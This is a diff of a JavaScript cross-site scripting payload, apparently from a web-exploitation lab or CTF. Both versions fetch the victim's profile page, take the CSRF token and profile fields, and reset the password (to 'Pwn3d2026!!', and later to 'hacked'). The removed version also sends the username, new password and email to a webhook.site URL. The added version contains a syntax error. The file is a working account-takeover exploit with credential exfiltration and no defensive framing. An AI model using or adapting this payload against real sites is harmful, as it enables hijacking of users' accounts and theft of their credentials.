@@ -1,29 +1,24 @@
-fetch('/profile',{credentials:'include'}).then(r=>r.text()).then(h=>{
-  let d=new DOMParser().parseFromString(h,'text/html');
-  let t=d.querySelector('[name="csrf_token"]')?.value;
-  if(!t)return;
-  let u=d.querySelector('[name="username"]')?.value||'';
-  let f=d.querySelector('[name="firstname"]')?.value||'';
-  let l=d.querySelector('[name="lastname"]')?.value||'';
-  let e=d.querySelector('[name="email"]')?.value||'';
-  
-  const p='Pwn3d2026!!';
-  
-  let b=new URLSearchParams();
-  b.append('csrf_token',t);
-  b.append('username',u);
-  b.append('firstname',f);
-  b.append('lastname',l);
-  b.append('email',e);
-  b.append('password',p);
-  b.append('passwordCheck',p);
-  b.append('submit','Submit');
+fetch('/profile')
+  .then(response => response.text())
+  .then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
 
-  fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?test=script-ran')
-  .catch(()=>{});
+    const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
 
-  
-  fetch('/profile',{method:'POST',credentials:'include',body:b}).then(()=>{
-    fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?username='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&email='+encodeURIComponent(e),{mode:'no-cors'});
-  });
-})
+    const params = new URLSearchParams();
+    params.append('csrf_token', csrfToken);
+    params.append('username', doc.querySelector('input[name="username"]').value);
+    params.append('firstname', doc.querySelector('input[name="firstname"]').value);
+    params.append('lastname', doc.querySelector('input[name="lastname"]').value);
+    params.append('email', doc.querySelector('input[name="email"]').value);
+    params.append('password' 'hacked');
+    params.append('passwordCheck', 'hacked');
+
+
+    return fetch('/profile', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params.toString()
+    });
+  })
